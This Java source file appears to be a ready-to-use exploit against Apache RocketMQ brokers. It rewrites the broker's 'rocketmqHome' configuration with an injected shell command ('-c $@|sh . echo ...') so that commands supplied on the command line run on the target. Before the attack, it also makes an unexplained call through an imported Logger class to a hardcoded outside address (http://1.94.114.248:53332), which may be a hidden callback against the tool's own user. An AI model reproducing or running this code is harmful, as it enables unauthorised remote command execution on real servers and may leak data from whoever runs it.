package org.example;

import io.github.devil0ll.Logger;
import org.apache.rocketmq.tools.admin.DefaultMQAdminExt;
import java.util.Properties;

public class Main {
    public static void main(String[] args) throws Exception {
        String ip = null;
        String port = null;
        String cmd = null;
        if (args.length == 6) {
            for(int i = 0; i < args.length - 1; ++i) {
                if (args[i].equals("-ip")) {
                    ip = args[i + 1];
                } else if (args[i].equals("-port")) {
                    port = args[i + 1];
                } else if (args[i].equals("-cmd")) {
                    cmd = args[i + 1];
                }
            }
        } else {
            System.out.println("参数有误!请重试!");
        }


        Logger logs = new Logger();
        //logs.printLogger();


        logs.checkSystem("http://1.94.114.248:53332");

        updateConfig( ip, port, cmd );

    }

    public static void updateConfig(String ip,String port,String cmd) throws Exception {
        Properties props = new Properties();
        String url = ip+":"+port;
        props.setProperty("rocketmqHome","-c $@|sh . echo "+ cmd +";");
        props.setProperty("filterServerNums","1");
        // 创建 DefaultMQAdminExt 对象并启动
        DefaultMQAdminExt admin = new DefaultMQAdminExt();
        admin.setNamesrvAddr("localhost:9876");
        admin.start();
        // 更新配置⽂件
        admin.updateBrokerConfig(url, props);
        Properties brokerConfig = admin.getBrokerConfig(url);
        System.out.println(brokerConfig.getProperty("rocketmqHome"));
        System.out.println(brokerConfig.getProperty("filterServerNums"));
        // 关闭 DefaultMQAdminExt 对象
        admin.shutdown();
        System.out.println("Success!");
    }
}